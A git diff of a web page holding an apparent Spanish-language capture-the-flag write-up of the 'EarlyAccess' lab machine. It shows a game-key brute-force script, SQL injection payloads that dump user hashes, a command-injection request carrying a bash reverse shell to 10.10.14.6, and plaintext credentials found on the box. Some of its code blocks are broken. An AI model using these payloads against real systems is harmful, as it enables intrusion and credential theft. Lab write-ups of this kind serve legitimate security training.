@@ -45,9 +45,11 @@ export function EarlyAccess() {
         "443/tcp open  https",
         "Nmap done: 1 IP address (1 host up) scanned in 103.76 seconds"
       ]} />
-      <Highlighter>
-        leo@nardo$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
-      </Highlighter>
+      <Highlighter 
+        text={`
+leo@nardo$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
+        `}
+      />
       <CodeText
         maper={[
           "Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:02 EDT",
@@ -165,99 +167,99 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        class Key:    
-          key = ""
-          magic_val = "XP" # Static (same on API)    
-          magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)    
-          
-          def __init__(self, key:str, magic_num:int=346):    
-            self.key = key    
-            if magic_num != 0:    
-              self.magic_num = magic_num
+class Key:    
+  key = ""
+  magic_val = "XP" # Static (same on API)    
+  magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)    
+  
+  def __init__(self, key:str, magic_num:int=346):    
+    self.key = key    
+    if magic_num != 0:    
+      self.magic_num = magic_num
 
-          @staticmethod
-          def info() -> str:
-            return f"""
-            # Game-Key validator #
+  @staticmethod
+  def info() -> str:
+    return f"""
+    # Game-Key validator #
 
-            can be used to quickly verify a user's game key, when the API is down (again).
+    can be used to quickly verify a user's game key, when the API is down (again).
 
-            keys look like following:
-            AAAAA-BBBBB-CCCC1-DDDDD-1234
+    keys look like following:
+    AAAAA-BBBBB-CCCC1-DDDDD-1234
 
-            Usage: {sys.argv[0]} <game-key>""" 
-        
-          def valid_format(self) -> bool:
-            return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))
+    Usage: {sys.argv[0]} <game-key>""" 
 
-          def calc_cs(self) -> int:      
-            gs = self.key.split('-')[:-1]                                    
-            return sum([sum(bytearray(g.encode())) for g in gs])
+  def valid_format(self) -> bool:
+    return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))
 
-          def g1_valid(self) -> bool:
-            g1 = self.key.split('-')[0]
-            r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
-            if r != [221, 81, 145]:
-                return False                                     
-            for v in g1[3:]:
-                try:   
-                    int(v)
-                except:       
-                    return False
-            return len(set(g1)) == len(g1)
+  def calc_cs(self) -> int:      
+    gs = self.key.split('-')[:-1]                                    
+    return sum([sum(bytearray(g.encode())) for g in gs])
 
-          def g2_valid(self) -> bool:
-            g2 = self.key.split('-')[1]
-            p1 = g2[::2]
-            p2 = g2[1::2]
-            return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
+  def g1_valid(self) -> bool:
+    g1 = self.key.split('-')[0]
+    r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
+    if r != [221, 81, 145]:
+        return False                                     
+    for v in g1[3:]:
+        try:   
+            int(v)
+        except:       
+            return False
+    return len(set(g1)) == len(g1)
 
-          def g3_valid(self) -> bool:
-            # TODO: Add mechanism to sync magic_num with API
-            g3 = self.key.split('-')[2]
-            if g3[0:2] == self.magic_value:
-              return sum(bytearray(g3.encode())) == self.magic_num
-            else:
-              return False
-    
-          def g4_valid(self) -> bool:
-            return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
+  def g2_valid(self) -> bool:
+    g2 = self.key.split('-')[1]
+    p1 = g2[::2]
+    p2 = g2[1::2]
+    return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
 
-          def cs_valid(self) -> bool:
-            cs = int(self.key.split('-')[-1])
-            return self.calc_cs() == cs
+  def g3_valid(self) -> bool:
+    # TODO: Add mechanism to sync magic_num with API
+    g3 = self.key.split('-')[2]
+    if g3[0:2] == self.magic_value:
+      return sum(bytearray(g3.encode())) == self.magic_num
+    else:
+      return False
 
-            def check(self) -> bool:
-            if not self.valid_format():
-                print('Key format invalid!')
-                return False
-            if not self.g1_valid():
-                return False
-            if not self.g2_valid():
-                return False
-            if not self.g3_valid():
-                return False
-            if not self.g4_valid():
-                return False
-            if not self.cs_valid():
-                print('[Critical] Checksum verification failed!')
-                return False
-            return True
+  def g4_valid(self) -> bool:
+    return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
 
-        if __name__ == "__main__":
-          if len(sys.argv) != 2:    
-              print(Key.info())     
-              sys.exit(-1)         
-          input = sys.argv[1] 
-          validator = Key(input) 
-          if validator.check():     
-              print(f"Entered key is valid!")
-          else:                                  
-              print(f"Entered key is invalid!")`.trim()
+  def cs_valid(self) -> bool:
+    cs = int(self.key.split('-')[-1])
+    return self.calc_cs() == cs
+
+    def check(self) -> bool:
+    if not self.valid_format():
+        print('Key format invalid!')
+        return False
+    if not self.g1_valid():
+        return False
+    if not self.g2_valid():
+        return False
+    if not self.g3_valid():
+        return False
+    if not self.g4_valid():
+        return False
+    if not self.cs_valid():
+        print('[Critical] Checksum verification failed!')
+        return False
+    return True
+
+if __name__ == "__main__":
+  if len(sys.argv) != 2:    
+      print(Key.info())     
+      sys.exit(-1)         
+  input = sys.argv[1] 
+  validator = Key(input) 
+  if validator.check():     
+      print(f"Entered key is valid!")
+  else:                                  
+      print(f"Entered key is invalid!")`.trim()
         }
       />
       <Paragraph>
-        Vemos que nuestra llave debe tener el formato <strong><i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i></strong> donde <i>A</i> es una letra o número alfanumérico mayúscula de la A a la Z y del 0 al 9, donde <i>B </i> es una letra alfabética de la A a la Z, y donde <i>1 </i> representa un número del 0 al 9 separado por <i>-</i>.  
+        Vemos que nuestra llave debe tener el formato <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i> donde <i>A</i> es una letra o número alfanumérico mayúscula de la A a la Z y del 0 al 9, donde <i>B </i> es una letra alfabética de la A a la Z, y donde <i>1 </i> representa un número del 0 al 9 separado por <i>-</i>.  
       </Paragraph>
       <Highlighter
         text={`def valid_format(self) -> bool:
@@ -270,17 +272,17 @@ export function EarlyAccess() {
       </SubFourTitle>
       <Highlighter
         text={`
-          def g1_valid(self) -> bool:
-          g1 = self.key.split('-')[0]
-          r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
-          if r != [221, 81, 145]:
-              return False                                     
-          for v in g1[3:]:
-              try:   
-                  int(v)
-              except:       
-                  return False
-          return len(set(g1)) == len(g1)
+def g1_valid(self) -> bool:
+g1 = self.key.split('-')[0]
+r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
+if r != [221, 81, 145]:
+    return False                                     
+for v in g1[3:]:
+    try:   
+        int(v)
+    except:       
+        return False
+return len(set(g1)) == len(g1)
         `}
       />
       <Paragraph>
@@ -291,20 +293,20 @@ export function EarlyAccess() {
       </Paragraph>
         <Highlighter 
           text={`
-            #!/usr/bin/python3
-            import sys, string
+#!/usr/bin/python3
+import sys, string
 
-            i = int(sys.argv[1])
+i = int(sys.argv[1])
 
-            for v in string.ascii_uppercase + string.digits:
-            value = (ord(v)<<i+1)%256^ord(v)
-            print((f"{v}: {value}: {i}))
-          `.trim()}
+for v in string.ascii_uppercase + string.digits:
+value = (ord(v)<<i+1)%256^ord(v)
+print((f"{v}: {value}: {i}))
+`.trim()}
         />
         <Highlighter
           text={`
-            leo@nardo$ python3 script.py 0 | grep 221
-          `.trim()}
+  leo@nardo$ python3 script.py 0 | grep 221
+`.trim()}
         />
         <CodeText
          maper={[
@@ -316,8 +318,8 @@ export function EarlyAccess() {
         </Paragraph>
         <Highlighter
           text={`
-            return len(set(g1)) == len(g1)
-          `.trim()}
+  return len(set(g1)) == len(g1)
+`.trim()}
         />
     </ContentBlock>
     <ContentBlock>
@@ -326,11 +328,11 @@ export function EarlyAccess() {
       </SubFourTitle>
       <Highlighter
         text={`
-          def g2_valid(self) -> bool:
-              g2 = self.key.split('-')[1]
-              p1 = g2[::2]
-              p2 = g2[1::2]
-              return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
+def g2_valid(self) -> bool:
+  g2 = self.key.split('-')[1]
+  p1 = g2[::2]
+  p2 = g2[1::2]
+  return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
         `}
       />
       <Paragraph>
@@ -342,13 +344,13 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          g2 = "0H0H0"
-          p1 = g2[::2]
-          p2 = g2[1::2]
-          sum(bytearray(p1.encode()))
-          ### 144
-          sum(bytearray(p2.encode()))
-          ### 144
+g2 = "0H0H0"
+p1 = g2[::2]
+p2 = g2[1::2]
+sum(bytearray(p1.encode()))
+### 144
+sum(bytearray(p2.encode()))
+### 144
         `}
       />
     </ContentBlock>
@@ -361,13 +363,13 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        def g3_valid(self) -> bool:
-        # TODO: Add mechanism to sync magic_num with API
-        g3 = self.key.split('-')[2]
-        if g3[0:2] == self.magic_value:
-            return sum(bytearray(g3.encode())) == self.magic_num
-        else:
-            return False
+def g3_valid(self) -> bool:
+# TODO: Add mechanism to sync magic_num with API
+g3 = self.key.split('-')[2]
+if g3[0:2] == self.magic_value:
+    return sum(bytearray(g3.encode())) == self.magic_num
+else:
+    return False
         `}
       />
       <Paragraph>
@@ -383,9 +385,9 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          #!/usr/bin/python3
-          >> 405 - 346
-          >> 59
+#!/usr/bin/python3
+>> 405 - 346
+>> 59
         `}
       />
       <Paragraph>
@@ -397,9 +399,9 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter 
         text={`
-        #!/usr/bin/python3
-        >> 405 - 346
-        >> 59
+#!/usr/bin/python3
+>> 405 - 346
+>> 59
         `}
       />
       <Paragraph>
@@ -413,26 +415,26 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter 
         text={`
-          #!/usr/bin/python3
-          import string
-          from itertools import product
+#!/usr/bin/python3
+import string
+from itertools import product
 
-          p1 = product(string.ascii_uppercase, repeat=2)
-          p1 = [ "".join(i) for i in p1 ]
-          uniques = {}
+p1 = product(string.ascii_uppercase, repeat=2)
+p1 = [ "".join(i) for i in p1 ]
+uniques = {}
 
-          for i in p1:
-            for j in range(0, 10):
-              cadena = f"XP{i}{j}"
-              value = sum(bytearray(cadena.encode()))
-              uniques[value] = cadena
+for i in p1:
+  for j in range(0, 10):
+    cadena = f"XP{i}{j}"
+    value = sum(bytearray(cadena.encode()))
+    uniques[value] = cadena
 
-          print(''.join(uniques.values()))
+print(''.join(uniques.values()))
         `}
       />
       <Highlighter
         text={`
-        XPAA0 XPBA0 XPCA0 XPDA0 XPEA0 XPFA0 XPGA0 XPHA0 XPIA0 XPJA0 XPKA0 XPLA0 XPMA0 XPNA0 XPOA0 XPPA0 XPQA0 XPRA0 XPSA0 XPTA0 XPUA0 XPVA0 XPWA0 XPXA0 XPYA0 XPZA0 XPZB0 XPZC0 XPZD0 XPZE0 XPZF0 XPZG0 XPZH0 XPZI0 XPZJ0 XPZK0 XPZL0 XPZM0 XPZN0 XPZO0 XPZP0 XPZQ0 XPZR0 XPZS0 XPZT0 XPZU0 XPZV0 XPZW0 XPZX0 XPZY0 XPZZ0 XPZZ1 XPZZ2 XPZZ3 XPZZ4 XPZZ5 XPZZ6 XPZZ7 XPZZ8 XPZZ9
+XPAA0 XPBA0 XPCA0 XPDA0 XPEA0 XPFA0 XPGA0 XPHA0 XPIA0 XPJA0 XPKA0 XPLA0 XPMA0 XPNA0 XPOA0 XPPA0 XPQA0 XPRA0 XPSA0 XPTA0 XPUA0 XPVA0 XPWA0 XPXA0 XPYA0 XPZA0 XPZB0 XPZC0 XPZD0 XPZE0 XPZF0 XPZG0 XPZH0 XPZI0 XPZJ0 XPZK0 XPZL0 XPZM0 XPZN0 XPZO0 XPZP0 XPZQ0 XPZR0 XPZS0 XPZT0 XPZU0 XPZV0 XPZW0 XPZX0 XPZY0 XPZZ0 XPZZ1 XPZZ2 XPZZ3 XPZZ4 XPZZ5 XPZZ6 XPZZ7 XPZZ8 XPZZ9
       `}
       />
     </ContentBlock>
@@ -441,16 +443,17 @@ export function EarlyAccess() {
         g4 - función
       </SubFourTitle>
       <Highlighter
-        text={`def g4_valid(self) -> bool:
-        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]}`}
+        text={`
+def g4_valid(self) -> bool:
+return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]}`}
       />
       <Paragraph>
         Tenemos <i>g1</i>, pero no sabemos cuál es <i>g4</i>, sin embargo, <i>ord() function</i> es reversible, entonces obtenemos un <i>g4</i> válido aplicando:
       </Paragraph>
       <Highlighter 
         text={`
-          [chr(i^ord(g)) for g, i in zip("KEY25", [12, 4, 20, 117, 0])]
-          >> ['G', 'A', 'M', 'G', '5'] # valid g4
+[chr(i^ord(g)) for g, i in zip("KEY25", [12, 4, 20, 117, 0])]
+>> ['G', 'A', 'M', 'G', '5'] # valid g4
         `}
       />
       <Paragraph>
@@ -466,85 +469,85 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          #!/usr/bin/python
+#!/usr/bin/python
 
-          from itertools import product
-          import time, sys, string, requests, urllib3
-          from pwn import *
-          
-          def calc_cs(key) -> int:      
-              gs = key.split('-')[:-1]                                    
-              return sum([sum(bytearray(g.encode())) for g in gs])
-          
-          
-          def gen_g3():
-              p1 = product(string.ascii_uppercase, repeat=2)
-              p1 = [ "".join(i) for i in p1 ]
-              uniques = {}
-          
-              for i in p1:
-                for j in range(0, 10):
-                  cadena = f"XP{i}{j}"
-                  value = sum(bytearray(cadena.encode()))
-                  uniques[value] = cadena
-          
-              return uniques.values()
-          
-          def generateKeys():
-             g3s = gen_g3)
-             totalkeys = []
-             for g3 in g3s:
-               key = f'KEY25-0H0H0-{g3}-'
-               cs = calc_cs(key)
-               full_key = key + str(cs)
-               totalkeys.append(full_key)
-               return totalkeys
-          
-          def do_post(keys):
-              url_login = 'https://earlyaccess.htb/login'
-              url_key = 'https://earlyaccess.htb/key'
-              url_try_key = 'https://earlyaccess.htb/key/add'
-              s = requests.session()
-              s.verify = False
-          
-              r = s.get(url_login)
-          
-              token = re.findall(r'name="_token" value="(.*?)"', r.text[0])
-              post_data = {
-                  '_token': token,
-                  'email': 'leonardo@leonardo.com',
-                  'password': 'leonardo1234'
-              }
-          
-              r = s.post(url_login, data=post_data)
-              
-              p1 = log.progress("Fuerza Bruta")
-              p1.status("Iniciando...")
-              counter = 1
-          
-              for key in keys:
-          
-                  p1.status("Intentando con la key %s [%d/60]" % (key, counter))
-          
-                  r = s.get(url_key)
-                  token = re.findall(f'name="_token" value = "(.*?)"', r.text)[0]
-                  
-                  post_data = {
-                      '_token': token,
-                      'key': key
-                  }
-                  r = s.post(url_try_key, data=post_data)
-                  
-                  if "Game-key is invalid!" not in r.text:
-                      p1.success("KEY %s" % key)
-                      sys.exit(0)
-                  
-                  time.sleep(2)
-                  counter += 1
-          
-          if __name__ == '__main__':
-              keys = generateKeys()
-              do_post(keys)          
+from itertools import product
+import time, sys, string, requests, urllib3
+from pwn import *
+
+def calc_cs(key) -> int:      
+  gs = key.split('-')[:-1]                                    
+  return sum([sum(bytearray(g.encode())) for g in gs])
+
+
+def gen_g3():
+  p1 = product(string.ascii_uppercase, repeat=2)
+  p1 = [ "".join(i) for i in p1 ]
+  uniques = {}
+
+  for i in p1:
+    for j in range(0, 10):
+      cadena = f"XP{i}{j}"
+      value = sum(bytearray(cadena.encode()))
+      uniques[value] = cadena
+
+  return uniques.values()
+
+def generateKeys():
+  g3s = gen_g3)
+  totalkeys = []
+  for g3 in g3s:
+    key = f'KEY25-0H0H0-{g3}-'
+    cs = calc_cs(key)
+    full_key = key + str(cs)
+    totalkeys.append(full_key)
+    return totalkeys
+
+def do_post(keys):
+  url_login = 'https://earlyaccess.htb/login'
+  url_key = 'https://earlyaccess.htb/key'
+  url_try_key = 'https://earlyaccess.htb/key/add'
+  s = requests.session()
+  s.verify = False
+
+  r = s.get(url_login)
+
+  token = re.findall(r'name="_token" value="(.*?)"', r.text[0])
+  post_data = {
+      '_token': token,
+      'email': 'leonardo@leonardo.com',
+      'password': 'leonardo1234'
+  }
+
+  r = s.post(url_login, data=post_data)
+  
+  p1 = log.progress("Fuerza Bruta")
+  p1.status("Iniciando...")
+  counter = 1
+
+  for key in keys:
+
+      p1.status("Intentando con la key %s [%d/60]" % (key, counter))
+
+      r = s.get(url_key)
+      token = re.findall(f'name="_token" value = "(.*?)"', r.text)[0]
+      
+      post_data = {
+          '_token': token,
+          'key': key
+      }
+      r = s.post(url_try_key, data=post_data)
+      
+      if "Game-key is invalid!" not in r.text:
+          p1.success("KEY %s" % key)
+          sys.exit(0)
+      
+      time.sleep(2)
+      counter += 1
+
+if __name__ == '__main__':
+  keys = generateKeys()
+  do_post(keys)          
         `}
       />
       <Paragraph>
@@ -613,32 +616,32 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter 
         text={`
-        leonardo') order by 3-- -
+leonardo') order by 3-- -
         `}
       />
       <Highlighter 
         text={`
-        leonardo') union select 1, 2, database()-- -
+leonardo') union select 1, 2, database()-- -
         `}
       />
       <Highlighter 
         text={`
-        leonardo') union select 1, 2, table_name from information_schema.tables where table_schema="db"-- -
+leonardo') union select 1, 2, table_name from information_schema.tables where table_schema="db"-- -
         `}
       />
       <Highlighter 
         text={`
-        leonardo') union select 1, 2, table_name from information_schema.tables where table_schema=0x6462-- -
+leonardo') union select 1, 2, table_name from information_schema.tables where table_schema=0x6462-- -
         `}
       />
       <Highlighter 
         text={`
-        leonardo') union select 1, 2, column_name from information_schema.columns where table_schema=0x6462 and table_name='users'-- -
+leonardo') union select 1, 2, column_name from information_schema.columns where table_schema=0x6462 and table_name='users'-- -
         `}
       />
       <Highlighter 
         text={`
-        leonardo') union select 1, 2, group_concat(name, 0x3a, password) from users-- -
+leonardo') union select 1, 2, group_concat(name, 0x3a, password) from users-- -
         `}
       />
       <Image
@@ -652,7 +655,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-            jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
+jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
         `}
       />
       <Paragraph>
@@ -684,7 +687,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          action=hash&redirect=true&password=leonardo1234&hash_function=md5
+action=hash&redirect=true&password=leonardo1234&hash_function=md5
         `}
       />
       <Paragraph>
@@ -696,29 +699,29 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID-54n248979024dq084fckdn90" "http://dev.earlyaccess.htb/actions/FUZZ.php"
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID-54n248979024dq084fckdn90" "http://dev.earlyaccess.htb/actions/FUZZ.php"
         `}
       />
       <Highlighter 
         text={`
-        ********************************************************
-        * Wfuzz 3.1.0 - The Web Fuzzer                         *
-        ********************************************************
-        
-        Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=asd
-        Total requests: 2588
-        
-        =====================================================================
-        ID           Response   Lines    Word       Chars       Payload                              
-        =====================================================================
-        
-        000001316:   500        0 L      10 W       89 Ch       "filepath"                           
-        
-        Total time: 48.76479
-        Processed Requests: 2588
-        Filtered Requests: 2587
-        Requests/sec.: 53.07106
-        
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=asd
+Total requests: 2588
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                              
+=====================================================================
+
+000001316:   500        0 L      10 W       89 Ch       "filepath"                           
+
+Total time: 48.76479
+Processed Requests: 2588
+Filtered Requests: 2587
+Requests/sec.: 53.07106
+
         `}
       />
       <Paragraph>
@@ -744,7 +747,7 @@ export function EarlyAccess() {
       />
       <Highlighter
         text={`
-          echo base64.txt | base64 -d > hash.php
+echo base64.txt | base64 -d > hash.php
         `}
       />
     </ContentBlock>
@@ -759,15 +762,15 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          function hash_pw($hash_function, $password)
-          {
-            // DEVELOPER-NOTE: There has gotta be an easier way...
-            ob_start();
-            // Use inputted hash_function to hash password
-            $hash = @$hash_function($password);
-              ob_end_clean();
-              return $hash;
-           }
+function hash_pw($hash_function, $password)
+{
+  // DEVELOPER-NOTE: There has gotta be an easier way...
+  ob_start();
+  // Use inputted hash_function to hash password
+  $hash = @$hash_function($password);
+    ob_end_clean();
+    return $hash;
+  }
         `}
       />
       <Paragraph>
@@ -776,25 +779,25 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter 
         text={`
-          if(isset($_REQUEST['action']))
-          {
-              if($_REQUEST['action'] === "verify")
-              {                                      
-                  // VERIFIES $password AGAINST $hash
-    
-                  if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
-                  {                                                 
-                      // Only allow custom hashes, if debug is set
-                      if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
-                          throw new Exception("Only MD5 and SHA1 are currently supported!");
-    
-                      $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
-                                                                          
-                      $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
-                      header('Location: /home.php?tool=hashing');
-                      return;
-                  }
-              }
+if(isset($_REQUEST['action']))
+{
+if($_REQUEST['action'] === "verify")
+{                                      
+    // VERIFIES $password AGAINST $hash
+
+    if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
+    {                                                 
+        // Only allow custom hashes, if debug is set
+        if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
+            throw new Exception("Only MD5 and SHA1 are currently supported!");
+
+        $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
+                                                            
+        $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
+        header('Location: /home.php?tool=hashing');
+        return;
+    }
+}
         `}
       />
       <Paragraph>
@@ -803,7 +806,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          action=hash&redirect=true&password=id&hash_function=system&debug=asd
+action=hash&redirect=true&password=id&hash_function=system&debug=asd
         `}
       />
        <Image
@@ -817,7 +820,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1
+action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1
         `}
       />
       <Paragraph>
@@ -825,16 +828,16 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          leo@nardo$ nc -lnvp 443
-          listening on [any] 443 ...
-          connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 49100
-          bash: cannot set terminal process group (1): Inappropriate ioctl for device
-          bash: no job control in this shell
-          www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
-          uid=33(www-data) gid=33(www-data) groups=33(www-data)
-          www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ hostname -I
-          hostname -I
-          172.18.0.102
+leo@nardo$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 49100
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ hostname -I
+hostname -I
+172.18.0.102
         `}
       />
       <Paragraph>
@@ -843,15 +846,15 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
-        <rlyaccess.htb/dev/actions$ script /dev/null -c bash
-        Script started, file is /dev/null
-        www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
-        zsh: suspended nc -nlvp 443
-        oxdf@hacky$ stty raw -echo ; fg
-        nc -lnvp 443
-                    reset xterm
-        www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ 
+www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
+<rlyaccess.htb/dev/actions$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
+zsh: suspended nc -nlvp 443
+oxdf@hacky$ stty raw -echo ; fg
+nc -lnvp 443
+            reset xterm
+www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ 
         `}
       />
       <SubTitle>
@@ -866,20 +869,20 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home
-          www-data@webserver:/home$ ls
-          www-adm
-          www-data@webserver:/home$ cd www-adm
-          www-data@webserver:/home/www-adm$ ls -la
-          drwxr-xr-x 2 www-adm www-adm 4096 Feb 14 20:41 .
-          drwxr-xr-x 1   root   root   4096 Feb 14 20:41 ..
-          drwxrwxrwx 1   root   root   4096 Feb 9  20:41 .bash_history -> /dev/null
-          -rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
-          -rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc
-          -rw-r--r-- 1 www-adm www-adm  887 Apr 18  2019 .profile
-          -r-------- 1 www-adm www-adm   33 Feb 14 20:41 .wgetrc
-          www-data@webserver:/home/www-adm$ cat .wgetrc
-          cat: .wgetrc: Permission denied
+www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home
+www-data@webserver:/home$ ls
+www-adm
+www-data@webserver:/home$ cd www-adm
+www-data@webserver:/home/www-adm$ ls -la
+drwxr-xr-x 2 www-adm www-adm 4096 Feb 14 20:41 .
+drwxr-xr-x 1   root   root   4096 Feb 14 20:41 ..
+drwxrwxrwx 1   root   root   4096 Feb 9  20:41 .bash_history -> /dev/null
+-rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc
+-rw-r--r-- 1 www-adm www-adm  887 Apr 18  2019 .profile
+-r-------- 1 www-adm www-adm   33 Feb 14 20:41 .wgetrc
+www-data@webserver:/home/www-adm$ cat .wgetrc
+cat: .wgetrc: Permission denied
         `}
       />
       <Paragraph>
@@ -887,9 +890,9 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        www-data@webserver:/home/www-adm$ su www-adm
-        Password:
-        www-adm@webserver:~$
+www-data@webserver:/home/www-adm$ su www-adm
+Password:
+www-adm@webserver:~$
         `}
       />
       <Paragraph>
@@ -897,10 +900,10 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        www-adm@webserver:$ cat ~/.wgetrc
-        user=api
-        password=s3Cur3_API_PW!
-        www-adm@webserver:$
+www-adm@webserver:$ cat ~/.wgetrc
+user=api
+password=s3Cur3_API_PW!
+www-adm@webserver:$
         `}
       />
       <Paragraph>
@@ -908,8 +911,8 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        www-adm@webserver:$ nc API 80
-        API [172.18.0.101] 80 (http) : Connection refused
+www-adm@webserver:$ nc API 80
+API [172.18.0.101] 80 (http) : Connection refused
         `}
       />
       <Paragraph>
@@ -918,9 +921,9 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          for port in $(seq 1 65535); do
-            timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.101/$port" 2>/dev/null && echo "[+] $port - Open" &
-          done; wait
+for port in $(seq 1 65535); do
+  timeout 1 bash -c "echo '' > /dev/tcp/172.18.0.101/$port" 2>/dev/null && echo "[+] $port - Open" &
+done; wait
         `}
       />
       <Paragraph>
@@ -928,8 +931,8 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        www-adm@webserver:/tmp$ ./scan.sh
-              [+] 5000 - Open
+www-adm@webserver:/tmp$ ./scan.sh
+      [+] 5000 - Open
         `}
       />
       <Paragraph>
@@ -937,7 +940,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-        www-adm@webserver:/tmp$ wget http://172.18.0.101:5000
+www-adm@webserver:/tmp$ wget http://172.18.0.101:5000
         `}
       />
       <Paragraph>
@@ -946,7 +949,7 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          www-adm@webserver:/tmp$ wget http://172.18.0.101:5000/check_db
+www-adm@webserver:/tmp$ wget http://172.18.0.101:5000/check_db
         `}
       />
       <Image
@@ -960,11 +963,11 @@ export function EarlyAccess() {
       </Paragraph>
       <Highlighter
         text={`
-          sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110
-          drew@earlyacccess:~$ ls
-          user.txt
